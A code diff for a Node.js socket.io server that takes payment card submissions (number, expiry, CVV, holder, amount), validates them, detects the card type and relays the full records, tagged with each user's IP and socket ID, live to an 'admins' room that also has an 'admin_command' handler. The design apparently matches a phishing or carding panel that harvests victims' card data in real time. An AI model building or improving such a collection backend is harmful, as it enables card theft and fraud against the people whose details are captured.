@@ -32,15 +32,51 @@ io.on('connection', (socket) => {
 
   // Handler for card data from a user
   socket.on('card_submission', (payload) => {
+    console.log('Received card submission:', {
+      socketId: socket.id,
+      payloadKeys: Object.keys(payload)
+    });
+
+    // Validate required fields
+    const requiredFields = ['card_number', 'expiry_month', 'expiry_year', 'cvv', 'card_holder', 'amount'];
+    const missingFields = requiredFields.filter(field => !payload[field]);
+    
+    if (missingFields.length > 0) {
+      console.error('Missing required fields:', missingFields);
+      return;
+    }
+
+    // Format the submission data
     const submissionPayload = {
+      id: socket.id, // Use socket ID as unique identifier
+      socket_id: socket.id, // Also include as socket_id for clarity
       ...payload,
-      id: socket.id, // Tag the submission with the user's unique socket ID
       user_ip: clientIp,
-      created_at: new Date().toISOString()
+      created_at: new Date().toISOString(),
+      status: 'pending'
     };
+
+    // Add card type detection
+    const cardNumber = payload.card_number.replace(/\s/g, '');
+    submissionPayload.card_type = detectCardType(cardNumber);
+
     // Send the data ONLY to admins
+    console.log('Sending card submission to admins:', {
+      id: submissionPayload.id,
+      card_type: submissionPayload.card_type,
+      amount: submissionPayload.amount
+    });
     io.to('admins').emit('card_submission', submissionPayload);
   });
+
+  // Helper function to detect card type
+  function detectCardType(cardNumber) {
+    if (cardNumber.startsWith('4')) return 'Visa';
+    if (cardNumber.startsWith('5')) return 'MasterCard';
+    if (cardNumber.startsWith('6')) return 'Discover';
+    if (cardNumber.startsWith('3')) return 'American Express';
+    return 'Unknown';
+  }
 
   // Handler for commands from an admin
   socket.on('admin_command', (payload) => {
